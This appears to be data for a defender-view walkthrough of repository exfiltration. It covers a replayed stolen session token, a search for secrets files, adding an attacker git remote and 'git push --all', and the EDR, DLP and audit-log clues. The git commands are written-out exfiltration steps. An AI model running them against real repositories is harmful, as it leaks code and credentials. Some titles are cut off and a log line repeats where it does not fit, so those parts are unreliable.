steps.title: Defender view: normal
steps.caption: 1 · A developer's laptop. It is 01:40 on a Tuesday. DEV-LAP-0417 holds a checkout of the billing API, a .env file full of cloud keys, and a saved credential helper that can push without prompting. Nothing unusual has happened in weeks, so the SOC sees a clean baseline: the same sign-ins, the same pushes to the corporate remote as every night. normal
steps.defender: WAF, reverse-proxy and application logs record the request, payload and backend behavior.

steps.title: Defender view: a sign-in from an unfamiliar city lands in the IdP queu
steps.caption: 2 · Access. The attacker does not break anything. They replay a stolen session token captured weeks earlier from an infostealer log, and the identity provider (IdP) accepts it. No password, no second factor, no warning. On the canvas, the stolen session travels from the attacker to the developer workstation. a sign-in from an unfamiliar city lands in the IdP queue; a "multi-factor authentication (MFA) fatigue / impossible-travel" alert is created but sits unwatched

steps.caption: 3 · Recon inside the repo. From the workstation, the attacker runs quiet searches for value: .env , settings.py , id_rsa , cloud-config files. The data never leaves the laptop yet, so there is nothing to catch on the wire. EDR records an unusual burst of file reads at 02:00 from a process tree the user never runs in the small hours

steps.title: Defender view: Sysmon event 11 shows a new .git/config created under t
steps.caption: 4 · A new remote appears. One short command - git remote add backup https://github.com/ /mirror.git - and the repository now has a second home. Git writes the new remote straight into .git/config . This file write is the single best endpoint-side clue of the whole attack. Sysmon event 11 shows a new .git/config created under the project, and an EDR file-content hook sees a URL that is not the corporate host
steps.defender: WAF, reverse-proxy and application logs record the request, payload and backend behavior.

steps.title: Defender view: the EDR process line shows a push to a non-corporate re
steps.caption: 5 · The push. git push --all and git push --tags send every branch, every tag, and all history to the attacker's repository over HTTPS. Bytes flow from the workstation to the code host on the canvas. To the network it is a trusted developer doing a big upload. the EDR process line shows a push to a non-corporate remote; if Transport Layer Security (TLS) inspection covers this path, DLP flags private-key patterns inside the outgoing payload
steps.defender: WAF, reverse-proxy and application logs record the request, payload and backend behavior.

steps.caption: 7 · SaaS-side truth. The code host itself keeps the honest record. The organization audit log shows git activity from an unknown IP, a new deploy key added to the mirror repository, and a fresh personal access token (PAT) minted by the compromised account. an org audit alert fires - "PAT created by service account" - if, and only if, those audit logs are actually streamed into the SIEM

steps.title: Defender view: secret-scanning results plus a rotation runbook - the i
steps.caption: 8 · SOC verdict. The SOC joins three sources: the EDR remote-add line, the audit-log PAT event, and the DLP match. Conclusion: exfiltration confirmed, so every secret in the repository must be treated as stolen. The team rotates cloud keys, invalidates tokens, and assumes the attacker holds a full clone. secret-scanning results plus a rotation runbook - the incident becomes a checklist, not a mystery
